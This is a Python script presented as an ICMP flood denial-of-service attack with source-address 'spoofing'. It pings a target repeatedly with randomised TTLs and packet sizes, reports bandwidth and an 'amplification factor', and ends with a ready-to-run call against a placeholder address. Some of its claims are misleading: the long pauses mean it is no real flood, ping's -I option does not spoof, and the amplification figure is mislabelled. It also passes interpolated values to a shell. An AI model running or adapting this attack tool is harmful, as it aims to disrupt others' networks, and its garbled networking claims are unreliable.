import os
import random
import time
import subprocess
import psutil

# Predefined list of IP addresses (spoofing)
ip_pool = ['192.168.0.1', '192.168.0.2', '10.0.0.1', '10.0.0.2']

# Function to send ICMP packets using the 'ping' command
def send_icmp_packet(target_ip, ttl, packet_size, src_ip):
    cmd = f"ping -c 1 -s {packet_size} -t {ttl} -I {src_ip} {target_ip}"
    subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Function to measure network bandwidth usage (asymmetric bandwidth)
def measure_bandwidth():
    net_stats_before = psutil.net_io_counters()
    time.sleep(1)  # Sleep for 1 second to gather data
    net_stats_after = psutil.net_io_counters()

    bytes_sent = net_stats_after.bytes_sent - net_stats_before.bytes_sent
    bytes_recv = net_stats_after.bytes_recv - net_stats_before.bytes_recv

    return bytes_sent, bytes_recv

# Function to calculate the amplification factor
def calculate_amplification_factor(traffic_sent, traffic_received):
    if traffic_sent == 0:
        return 0
    return traffic_received / traffic_sent

# Main function to simulate ICMP Flood attack
def icmp_flood_attack(target_ip, duration=60):
    start_time = time.time()
    total_traffic_sent = 0
    total_traffic_received = 0

    # Measure initial bandwidth usage
    initial_sent, initial_received = measure_bandwidth()

    while time.time() - start_time < duration:
        # Randomize TTL values
        ttl = random.randint(50, 255)

        # Alternate packet sizes
        packet_size = random.choice([56, 128, 256, 512])

        # Spoof source IP address
        src_ip = random.choice(ip_pool)

        # Send ICMP packet
        send_icmp_packet(target_ip, ttl, packet_size, src_ip)

        # Measure bandwidth usage after each packet
        sent, received = measure_bandwidth()

        total_traffic_sent += sent
        total_traffic_received += received

        # Sleep for random interval between packets
        time.sleep(random.uniform(0.5, 2.0))

    # Calculate the amplification factor
    amplification_factor = calculate_amplification_factor(total_traffic_sent, total_traffic_received)

    # Measure final bandwidth usage
    final_sent, final_received = measure_bandwidth()

    # Calculate asymmetric bandwidth usage
    asymmetric_bandwidth = final_received - initial_received

    # Output results
    print(f"Total Traffic Sent (bytes): {total_traffic_sent}")
    print(f"Total Traffic Received (bytes): {total_traffic_received}")
    print(f"Amplification Factor: {amplification_factor:.2f}")
    print(f"Asymmetric Bandwidth Usage (bytes): {asymmetric_bandwidth}")

# Example usage
target_ip = '192.168.1.100'  # Replace with the target IP address
icmp_flood_attack(target_ip, duration=60)  # Run attack for 60 seconds
